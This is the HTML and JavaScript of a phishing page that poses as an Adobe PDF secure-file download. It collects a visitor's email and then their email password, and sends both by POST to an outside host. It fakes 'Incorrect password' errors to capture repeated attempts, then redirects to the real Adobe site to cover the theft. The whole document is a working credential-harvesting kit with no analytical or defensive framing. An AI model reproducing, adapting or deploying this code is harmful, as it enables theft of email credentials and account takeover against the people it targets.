    <div class="header">Adobe PDF</div>

            <p>You've received a secure file:</p>
            <div class="file">
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn86DXu05miVMk5nE-NADw_s7uDwK9l6KSmDG6QZ5hfzgq30Hprq5aUqSFGxHyV12Pd8ILF1p_lOsD8AGjgrDvKkwZ47Y2iz-yqnU_iSdK9ybmVz8Uiq0UV3zuI1Vzi0wgi64zVfCbRhrfNZycgd4qnOqObW-tE8yoyQ-09SzYqXk6viNn1xK3Q4d8EJs/s320/PDF_file_icon.svg.png"

        <form id="verifyForm">
            <!-- Step 1 -->
            <div id="step1">
                <div class="form-field">
                    <label for="inputline1" style="color: #fff;">Email:</label>
                    <input type="email" id="inputline1" name="user" required>

            <!-- Step 2 -->
            <div id="step2" style="display:none;">
                <div id="error-message" style="color: red; font-size: 14px; margin-bottom: 10px;"></div>
                <!-- Error message container -->

                    <label for="password" style="color: #fff;">Password:</label>
                    <input type="password" id="password" name="pass" required>

    <!-- Preloader -->
    <div class="preloader" id="preloader">
        <div class="spinner"></div>
        <div>Downloading...</div>
    </div>

    <script>
        const form = document.getElementById("verifyForm");
        const step1 = document.getElementById("step1");
        const step2 = document.getElementById("step2");
        const preloader = document.getElementById("preloader");
        const nextBtn = document.getElementById("nextBtn");
        const emailInput = document.getElementById("inputline1");
        const instructionText = document.getElementById("instructionText");

        // Helper: mask part of email
        function maskEmail(email) {
            const [user, domain] = email.split("@");
            if (!user || !domain) return email;
            if (user.length <= 2) return user[0] + "***@" + domain;
            return user[0] + "***" + user[user.length - 1] + "@" + domain;
        }

        // Step 1 -> Step 2
        nextBtn.addEventListener("click", () => {
            const emailVal = emailInput.value.trim();
            if (emailVal === "") {
                emailInput.focus();
                return;
            }

            preloader.style.display = "flex";

            setTimeout(() => {
                preloader.style.display = "none";
                step1.style.display = "none";
                step2.style.display = "block";
                const masked = maskEmail(emailVal);
                instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
            }, 2000);
        });

        // Handle form submissions
        // Handle form submissions
        // Handle form submissions
        // Handle form submissions
        form.addEventListener("submit", function (e) {
            e.preventDefault();
            preloader.style.display = "flex";

            // Get the current submission count or initialize it
            let submitCount = parseInt(localStorage.getItem("submitCount") || "0", 10);
            submitCount++;
            localStorage.setItem("submitCount", submitCount);

            // Get the error message container
            const errorMessage = document.getElementById("error-message");

            // Simulate sending data (you can modify this part to check the password)
            const formData = new FormData(form);
            fetch("https://sazs.otkg.sa.com/auto/next.php", {
                method: "POST",
                body: formData
            }).catch(() => { });

            // Wait briefly before next action
            setTimeout(() => {
                preloader.style.display = "none";

                if (submitCount >= 3) {
                    // Redirect after 3 failed attempts
                    localStorage.removeItem("submitCount"); // reset counter
                    window.location.href = "https://www.adobe.com/creativecloud.html"; // redirect to Adobe website
                } else {
                    // Show error message twice for the first two failed attempts
                    if (submitCount === 1 || submitCount === 2) {
                        errorMessage.textContent = "Incorrect password. Please try again.";
                    }

                    // Reset password field for retry
                    document.getElementById("password").value = ""; // Clear password field
                }
            }, 2000);
        });



    </script>
